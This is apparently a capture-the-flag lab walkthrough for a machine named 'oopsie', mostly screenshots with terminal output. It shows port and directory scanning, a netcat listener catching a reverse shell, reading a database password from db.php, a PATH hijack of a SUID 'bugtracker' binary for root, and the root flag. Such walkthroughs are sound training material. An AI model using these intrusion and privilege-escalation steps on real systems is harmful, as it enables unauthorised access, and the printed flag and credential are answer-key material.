
<img width="1608" height="317" alt="image" src="https://github.com/user-attachments/assets/8da8ef38-29d4-45a5-8c2c-92192350cc98" />





```
nmap -sV -sC -A 10.129.147.70                       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 13:09 -0400
Nmap scan report for 10.129.147.70
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   287.31 ms 10.10.14.1
2   290.74 ms 10.129.147.70


```

<img width="1786" height="574" alt="image" src="https://github.com/user-attachments/assets/c1fb2856-c102-492b-be48-fdd01a083123" />




<img width="1913" height="705" alt="image" src="https://github.com/user-attachments/assets/b44be256-b444-412c-9dcc-c76c0dc1f48d" />



<img width="2001" height="655" alt="image" src="https://github.com/user-attachments/assets/929aef86-c5c4-4165-a003-da57af0c2b40" />



<img width="1901" height="684" alt="image" src="https://github.com/user-attachments/assets/f7b0f8d8-11df-453e-b3cc-870128dc9977" />



<img width="1901" height="351" alt="image" src="https://github.com/user-attachments/assets/ec6e4a64-97af-47f7-bd3d-54698fa987db" />





<img width="1930" height="293" alt="image" src="https://github.com/user-attachments/assets/e3b95602-868e-4f0a-a8cd-86d57c8a7ff8" />








<img width="1885" height="696" alt="image" src="https://github.com/user-attachments/assets/f06ee706-19c1-4706-871d-d623540093fb" />



<img width="1681" height="532" alt="image" src="https://github.com/user-attachments/assets/d0e62d92-8a9c-4690-8f35-77f05c4e7cc7" />


<img width="1895" height="716" alt="image" src="https://github.com/user-attachments/assets/76035a8b-c79e-46af-9935-071de44e61ea" />


<img width="1103" height="375" alt="image" src="https://github.com/user-attachments/assets/06cd5383-49a7-4b07-8a0c-fb170eb7b5a0" />



```
gobuster dir -u  http://10.129.151.199 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.151.199
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 317] [--> http://10.129.151.199/images/]
index.php            (Status: 200) [Size: 10932]
themes               (Status: 301) [Size: 317] [--> http://10.129.151.199/themes/]
uploads              (Status: 301) [Size: 318] [--> http://10.129.151.199/uploads/]
css                  (Status: 301) [Size: 314] [--> http://10.129.151.199/css/]
js                   (Status: 301) [Size: 313] [--> http://10.129.151.199/js/]
Progress: 3947 / 175326 (2.25%)^C

```





<img width="1505" height="551" alt="image" src="https://github.com/user-attachments/assets/3cf56d94-15b9-40e5-a827-e57842febd4a" />


<img width="1299" height="459" alt="image" src="https://github.com/user-attachments/assets/14a82224-4d83-4093-a2ea-f84882ba8c56" />




<img width="1325" height="667" alt="image" src="https://github.com/user-attachments/assets/06d38491-54fe-4351-ac88-85f6d50c5b85" />


```
nc -lvnp 4444         
listening on [any] 4444 ...
connect to [10.10.14.107] from (UNKNOWN) [10.129.151.255] 41984
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:43:16 up 9 min,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /var/www/html/cdn-cgi/login
$ ls
admin.php
db.php
index.php
script.js
$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
$ 




```

<img width="1123" height="809" alt="image" src="https://github.com/user-attachments/assets/93248143-7962-4664-8402-616cfd17f9f9" />







<img width="1052" height="279" alt="image" src="https://github.com/user-attachments/assets/694fae6d-117f-4553-ae5b-37cd912ba64a" />



<img width="999" height="599" alt="image" src="https://github.com/user-attachments/assets/2432e150-13cf-4569-83c8-53c03e94052f" />






```
_find / -group bugtracker 2>/dev/null_
```


<img width="732" height="246" alt="image" src="https://github.com/user-attachments/assets/62df169d-6b0e-4711-a21d-d0fae3f0e5e7" />


<img width="1462" height="184" alt="image" src="https://github.com/user-attachments/assets/51597adb-4db3-4cfa-9bed-5e8fe9077bc5" />



```
robert@oopsie:~$ cd ../.././tmp
cd ../.././tmp
robert@oopsie:/tmp$ rm -f cat
rm -f cat
robert@oopsie:/tmp$ echo /bin/sh > cat
echo /bin/sh > cat
robert@oopsie:/tmp$ chmod +x cat
chmod +x cat
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
robert@oopsie:/tmp$ /usr/bin/bugtracker somefile
/usr/bin/bugtracker somefile

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2
2
---------------

# id
id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
# cd root
cd root
/bin/sh: 2: cd: can't cd to root
# ls
ls
cat
# pwd
pwd
/tmp
# cd ../../
cd ../../
# cd root
cd root
# cat  root.txt
cat  root.txt
# less root.txt

```


```
# cat  root.txt
cat  root.txt
# less root.txt
less root.txt
WARNING: terminal is not fully functional
root.txt  (press RETURN)
af13b0bee69f8a877c3faf667f7beacf
root.txt (END)

```


<img width="1221" height="706" alt="image" src="https://github.com/user-attachments/assets/ed861bfb-b661-4f5f-9d7b-e204ad1a3fdc" />









